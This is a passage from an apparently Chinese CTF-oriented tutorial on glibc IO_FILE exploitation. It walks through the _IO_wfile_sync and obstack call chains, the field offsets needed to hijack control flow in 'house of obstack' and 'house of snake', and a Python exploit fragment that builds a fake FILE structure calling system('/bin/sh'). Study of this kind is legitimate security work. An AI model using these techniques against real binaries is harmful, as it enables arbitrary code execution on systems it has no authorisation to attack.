<p>综上所述： * <code>_flags</code>设置为<code>~4</code> * <code>vtable</code>设置为<code>_IO_file_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可 * <code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code> * <code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code> * <code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code> * <code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code> * <code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code> * <code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code> * <code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>，如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制</p>
<h4 id="io_wfile_sync"><code>_IO_wfile_sync</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><code>_IO_wfile_sync</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 满足条件：</li>
</ol>
<ul>
<li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code></li>
<li><code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code></li>
<li><code>clen &lt;= 0</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code></li>
</ul>
<ol start="2" type="1">
<li><p><code>__libio_codecvt_length</code></p></li>
<li><p><code>DL_CALL_FCT</code></p></li>
<li><p>`gs = fp-&gt;_codecvt-&gt;__cd_out.step</p></li>
<li><p><code>*(gs-&gt;__fct)(gs)</code></p></li>
</ol>
<p>综上所述： * <code>_flags</code>设置为<code>~(4 | 0x10)</code> * <code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可 * <code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code> * <code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code> * <code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code> * <code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code> * <code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code> * <code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code> * <code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code> * <code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>，如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控</p>
<h3 id="house-of-琴瑟琵琶-house-of-obstack2.342.36">house of 琴瑟琵琶 | house of obstack(2.34~2.36)</h3>
<h4 id="io_obstack_file结构体"><code>_IO_obstack_file</code>结构体</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="io_obstack_overflow"><code>_IO_obstack_overflow</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><p><code>_IO_obstack_overflow</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);  <span class="comment">// 此处不可控</span></span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>obstack_1grow (obstack, c)</code></p></li>
<li><p><code>_obstack_newchunk (__o, 1)</code></p></li>
<li><p><code>new_chunk = CALL_CHUNKFUN (h, new_size)</code></p></li>
<li><p><code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p></li>
</ol>
<h4 id="io_obstack_xsputn优先选择"><code>_IO_obstack_xsputn(优先选择)</code></h4>
<ul>
<li>调用链</li>
</ul>
<ol type="1">
<li><p><code>_IO_obstack_xsputn</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> _IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment">     space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n); <span class="comment">//执行此函数</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>obstack_grow (obstack, data, n)</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        obstack_grow(obstack, data, n);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line"> 替换:  </span><br><span class="line">        (&#123;</span><br><span class="line">            <span class="keyword">struct</span> obstack *__o = (obstack);</span><br><span class="line">            <span class="type">int</span> __len = (n);</span><br><span class="line">            <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, __len);</span><br><span class="line">            <span class="built_in">memcpy</span>(__o-&gt;next_free, data, __len);</span><br><span class="line">            __o-&gt;next_free += __len;</span><br><span class="line">            (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>_obstack_newchunk (__o, __len)</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _obstack_newchunk(<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">    <span class="type">long</span> new_size;</span><br><span class="line">    <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> already;</span><br><span class="line">    <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">    new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">        new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">    new_chunk = CALL_CHUNKFUN(h, new_size); <span class="comment">// 调用函数位置</span></span><br><span class="line">    ...</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div></p></li>
<li><p><code>new_chunk = CALL_CHUNKFUN (h, new_size)</code> <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_chunk = CALL_CHUNKFUN(h, new_size);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_CHUNKFUN(h, size)                          \</span></span><br><span class="line"><span class="meta">    (((h)-&gt;use_extra_arg)                               \</span></span><br><span class="line"><span class="meta">             ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) \</span></span><br><span class="line"><span class="meta">             : (*(struct _obstack_chunk * (*) (long) )(h)-&gt;chunkfun)((size)))</span></span><br><span class="line">替换:  </span><br><span class="line">(((h)-&gt;use_extra_arg) ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (new_size)) : (*(<span class="keyword">struct</span> _obstack_chunk *(*) (<span class="type">long</span>) )(h)-&gt;chunkfun)((new_size)))</span><br></pre></td></tr></table></figure></div> 第一个参数可控，同时需要保证<code>(((h)-&gt;use_extra_arg)</code>为<code>1</code></p></li>
<li><p><code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code></p></li>
</ol>
<p>[[houseofobstack1.png]]</p>
<p>exp如下 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">obstack_ptr = fake_io_addr + <span class="number">0x30</span></span><br><span class="line">fake_io_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(system_addr)  <span class="comment"># 需要执行的函数</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(fake_io_addr+<span class="number">0xe8</span>)  <span class="comment"># 执行函数的 rdi</span></span><br><span class="line">fake_io_file += p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;use_extra_arg=1</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>)  <span class="comment"># _IO_lock_t *_lock;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_obstack_jumps_addr + <span class="number">0x20</span>)  <span class="comment"># 触发 _IO_obstack_xsputn;</span></span><br><span class="line">fake_io_file += p64(obstack_ptr)  <span class="comment"># struct obstack *obstack</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_io_file))) <span class="comment"># 因为是largebin attack 所以: 0xd8=0xe8-0x10</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行函数的 rdi 的地址所存储的内容</span></span><br><span class="line">payload = fake_io_file+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div></p>
<h3 id="house-of-snake">house of snake</h3>
<p>在<code>libc-2.37</code>后由<code>house of obstack</code>转换为<code>house of snake</code> 删除了 <code>_IO_obstack_jumps</code> 但是添加了 <code>_IO_printf_buffer_as_file_jumps</code> 这个新的 <code>_IO_jumps_t</code> 结构体 <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div> 其中<code>__printf_buffer_as_file_overflow</code> 函数定义如下： <div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> __attribute_warn_unused_result__</span><br><span class="line">__printf_buffer_has_failed(<span class="keyword">struct</span> __printf_buffer 